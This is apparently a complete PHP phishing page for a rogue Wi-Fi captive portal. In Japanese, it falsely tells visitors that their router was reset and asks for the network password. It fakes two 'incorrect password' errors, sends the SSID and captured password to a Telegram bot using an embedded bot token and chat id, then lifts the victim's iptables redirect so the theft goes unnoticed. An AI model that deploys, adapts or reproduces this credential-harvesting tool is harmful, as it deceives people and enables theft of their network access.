<?php
set_time_limit(60);

$token = '834034144:AAHVj2gRGsj2IegHSgVZsjJ0rrOHmE3ZmWI';
$chat = '-349544685';

if (isset($_POST['cou'])) {
	if ($_POST['cou'] <= 1) { // 2回エラーを出す
		$err = 'パスワードが正しくありません';
		$_POST['cou']++;
	}

	if ($err) {
		sleep(3);
	} else {
		file_get_contents('https://api.telegram.org/bot' . $token . '/sendMessage?chat_id='
			. $chat . '&disable_web_page_preview=true&parse_mode=HTML&text='
			. urlencode('[WIFI] SSID：' . file_get_contents('../conf/apname') .  '， PASS：' . $_POST['pass']));

		system('sudo iptables -t nat -D PREROUTING `sudo iptables -t nat -L --line-numbers '
			. '| grep "' . $_SERVER['REMOTE_ADDR'] . '" | grep ":80" | awk \'{print $1}\'`');

		header('HTTP/1.1 204 OK');
		if (strpos($_SERVER['HTTP_USER_AGENT'], 'Android') !== 0) {
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<html>
<head><title>Success</title></head>
<body>Success</body>
</html>
<?php
		}

		exit();
	}
} else {
	$_POST['cou'] = 1;
}
?>
<html>
<head>
	<meta charset="utf-8" />
	<link rel="stylesheet" type="text/css" href="style.css">
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no">
	<script>
function post() {
    document.getElementById('err').innerHTML = '';
    document.getElementById('submit').value = '設定してます';
    document.getElementById('submit').disabled = 'disabled';
}
	</script>
	<style>
* {
	box-sizing:border-box;
	font-size:1.0em;
}
:focus {
	outline:none;
}
input::placeholder {
  color:#aaa;
}
html {
	margin:0;
	padding:0;
}
body {
	margin:0;
	padding:20px;
	width:100%;
    line-height:2em;
}
a {
	color:#f88;
	text-decoration:none;
}
input {
	padding:10px;
	display:block;
}
input[type=email], input[type=password] {
	border:2px gray solid;
	border-radius:4px;
}
input[type=submit] {
	-webkit-appearance:none;
	border:2px gray solid;
	color:#444;
	background-color:#eee;
	border-radius:4px;
}
	</style>
</head>
<body>
	<form action="" method="post" onsubmit="post()">
		<div style="max-width:600px;">
			<span style="font-weight:bold;font-size:1.1em">Wi-Fiルーターの設定がリセットされました</span><br />
			<br />
			インターネット接続を継続するにはWi-Fiのパスワードが必要です。<br />
			<br />
			<span style="color:blue">対象のSSID: <b><?=file_get_contents('../conf/apname')?></b></span><br>
			パスワードが分からない場合はシステム管理者にお問い合わせ下さい。
		</div>
		<div id="err" style="font-size:0.9em;color:red;text-align:center;padding:10px"><?=$err?></div><br />
		<div style="max-width:600px;">
			パスワード
			<input type="password" id="pass" name="pass" style="width:100%;margin-bottom:40px" />
		</div>
		<input type="submit" id="submit" value="設定" style="width:70%;margin:0 auto 0 auto;padding:10px;" />
		<input type="hidden" id="cou" name="cou" value="<?=$_POST['cou']?>" />
		<br />
	</form>
</body>
</html>
